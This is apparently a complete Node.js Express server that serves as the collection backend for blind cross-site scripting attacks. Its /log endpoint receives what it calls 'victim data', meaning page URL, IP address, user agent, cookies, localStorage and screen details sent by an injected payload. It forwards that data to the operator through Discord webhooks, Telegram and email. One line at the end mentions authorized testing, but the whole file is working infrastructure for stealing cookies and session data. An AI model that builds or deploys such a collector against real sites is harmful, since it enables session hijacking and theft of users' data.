const express = require('express');
const fetch = require('node-fetch');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

const allowedOrigins = [
    'https://af6.surge.sh', 
    'http://localhost:8000',
    'http://127.0.0.1:5500'
];

const corsOptions = {
    origin: function (origin, callback) {

        if (!origin) return callback(null, true);
        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            console.log('🚫 Blocked by CORS:', origin);
            callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Payload-Source']
};
app.use(cors(corsOptions)); 

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const config = {
    discordWebhook: process.env.DISCORD_WEBHOOK_URL,
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,
    telegramChatId: process.env.TELEGRAM_CHAT_ID,
    adminEmail: process.env.ADMIN_EMAIL,
    emailPassword: process.env.EMAIL_PASSWORD,
    emailService: process.env.EMAIL_SERVICE || 'gmail',
    port: process.env.PORT || 3000
};

async function sendDiscordAlert(data) {
    if (!config.discordWebhook) {
        console.log('Discord: Webhook not configured.');
        return false;
    }
    
    const embed = {
        title: "🚨 BLIND XSS FOUND",
        color: 0xff0000,
        timestamp: data.timestamp,
        fields: [
            { name: "🌐 Target URL", value: `\`\`\`${data.url.substring(0, 1000)}\`\`\``, inline: false },
            { name: "📡 IP Address", value: `\`${data.publicIp}\``, inline: true },
            { name: "👤 User Agent", value: `\`\`\`${data.userAgent.substring(0, 500)}\`\`\``, inline: false },
            { name: "🍪 Cookies", value: data.cookies ? `\`\`\`${data.cookies.substring(0, 500)}\`\`\`` : 'None', inline: false },
            { name: "📦 LocalStorage", value: data.localStorage && data.localStorage.length > 10 ? 'Data Available' : 'None', inline: true },
            { name: "🖥️ Screen", value: data.screen || 'Unknown', inline: true }
        ],
        footer: { text: `Blind XSS Monitor • ${new Date().toLocaleString('en-US')}` } // <-- [PERBAIKI] Konsisten bahasa Inggris
    };
    
    try {
        const response = await fetch(config.discordWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log(`Discord: Notification sent, status: ${response.status}`);
        return response.ok;
    } catch (error) {
        console.error('Discord: Failed to send:', error.message);
        return false;
    }
}

async function sendTelegramAlert(data) {
    if (!config.telegramBotToken || !config.telegramChatId) {
        console.log('Telegram: Token or Chat ID not configured.');
        return false;
    }
    
    const messageText = `
🚨 *BLIND XSS FOUND*
⏰ *Time:* ${new Date(data.timestamp).toLocaleString('en-US')}
🌐 *URL:* ${data.url.substring(0, 200)}
📡 *IP:* ${data.publicIp}
👤 *Browser:* ${data.userAgent.split(')')[0].split('(')[1] || data.userAgent.substring(0, 50)}
🍪 *Cookies:* ${data.cookies ? 'Yes' : 'No'}
🖥️ *Screen:* ${data.screen}

_Full data available on server log._
    `;
    
    try {

        const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage?chat_id=${config.telegramChatId}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown&disable_web_page_preview=true`;
        
        const response = await fetch(url, { method: 'POST' });
        const result = await response.json();
        
        console.log(`Telegram: Notification sent, OK: ${result.ok}`);
        return result.ok;
    } catch (error) {
        console.error('Telegram: Failed to send:', error.message);
        return false;
    }
}

async function sendEmailAlert(data) {
    if (!config.adminEmail || !config.emailPassword) {
        console.log('Email: Configuration not complete.');
        return false;
    }
    
    let transporter;
    try {

        transporter = nodemailer.createTransport({
            service: config.emailService,
            auth: {
                user: config.adminEmail,
                pass: config.emailPassword
            }
        });
    } catch (error) {
        console.error('Email: Failed to create transporter:', error.message);
        return false;
    }
    
    const mailOptions = {
        from: `"Blind XSS Monitor" <${config.adminEmail}>`,
        to: config.adminEmail,
        subject: `🚨 Blind XSS Alert - ${new Date().toLocaleString('en-US')}`,
        html: `
            <div style="font-family: Arial, sans-serif;">
                <h2 style="color: #d63031;">🚨 Blind XSS Payload Triggered</h2>
                <p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString('en-US')}</p>
                <p><strong>Target URL:</strong> <a href="${data.url}">${data.url}</a></p>
                <p><strong>IP Address:</strong> <code>${data.publicIp}</code></p>
                <p><strong>User Agent:</strong> ${data.userAgent}</p>
                <hr>
                <h3>📊 Additional Data:</h3>
                <p><strong>Cookies:</strong> ${data.cookies ? 'Available (' + data.cookies.split(';').length + ' cookies)' : 'None'}</p>
                <p><strong>LocalStorage:</strong> ${data.localStorage && data.localStorage.length > 10 ? 'Available' : 'None'}</p>
                <p><strong>Screen:</strong> ${data.screen}</p>
                <hr>
                <p style="color: #7f8c8d; font-size: 0.9em;">Sent from Blind XSS Monitoring System</p>
            </div>
        `
    };
    
    try {
        const info = await transporter.sendMail(mailOptions);
        console.log(`Email: Sent to ${config.adminEmail}, Message ID: ${info.messageId}`);
        return true;
    } catch (error) {
        console.error('Email: Failed to send:', error.message);
        return false;
    }
}

app.post('/log', async (req, res) => {
    console.log('\n' + '='.repeat(60));
    console.log('📥 Receiving victim data...');
    
    const victimData = req.body;
    
    console.log(`🌐 URL: ${victimData.url}`);
    console.log(`📡 IP: ${victimData.publicIp}`);
    console.log(`👤 User Agent: ${victimData.userAgent?.substring(0, 80)}...`);
    console.log(`🍪 Cookies: ${victimData.cookies ? victimData.cookies.split(';').length + ' items' : 'None'}`);
    
    const notifications = await Promise.allSettled([
        sendDiscordAlert(victimData),
        sendTelegramAlert(victimData),
        sendEmailAlert(victimData)
    ]);
    
    const results = {
        discord: notifications[0].status === 'fulfilled' ? notifications[0].value : false,
        telegram: notifications[1].status === 'fulfilled' ? notifications[1].value : false,
        email: notifications[2].status === 'fulfilled' ? notifications[2].value : false
    };
    
    console.log('📤 Notification Summary:', results);
    console.log('='.repeat(60) + '\n');
    
    req.app.locals.lastTrigger = {
        time: new Date(),
        data: {
            url: victimData.url,
            ip: victimData.publicIp
        }
    };
    
    res.status(200).json({
        status: 'success',
        message: 'Data received and notifications sent.',
        notifications: results,
        received: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        service: 'blind-xss-monitor',
        uptime: process.uptime(),
        lastTrigger: req.app.locals.lastTrigger || 'None',
        environment: process.env.NODE_ENV || 'development',
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Blind XSS Monitoring Backend</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                code { background: #f4f4f4; padding: 2px 5px; }
            </style>
        </head>
        <body>
            <h1>🚨 Blind XSS Monitoring Backend</h1>
            <p>Backend is active and ready to receive data from your payload.</p>
            <p><strong>Main Endpoint:</strong> POST <code>/log</code></p>
            <p><a href="/health">Health Check</a></p>
            <hr>
            <p><small>Use only for authorized testing.</small></p>
        </body>
        </html>
    `);
});


app.listen(config.port, () => {
    console.log(`
╔═══════════════════════════════════════════════╗
║    🚨 BLIND XSS MONITORING BACKEND            ║
║    🔧 Port: ${config.port}                    ║
║    📅 ${new Date().toLocaleString('en-US')}   ║
║                                               ║
║    📍 Discord: ${config.discordWebhook ? '✅ Configured' : '❌ Not Set'}     ║
║    📍 Telegram: ${config.telegramBotToken ? '✅ Configured' : '❌ Not Set'}  ║
║    📍 Email: ${config.adminEmail ? '✅ Configured' : '❌ Not Set'}           ║
╚═══════════════════════════════════════════════╝
    `);
    console.log(`Server running on port ${config.port}`);
});

process.on('unhandledRejection', (error) => {
    console.error('⚠️ Unhandled Promise Rejection:', error);
});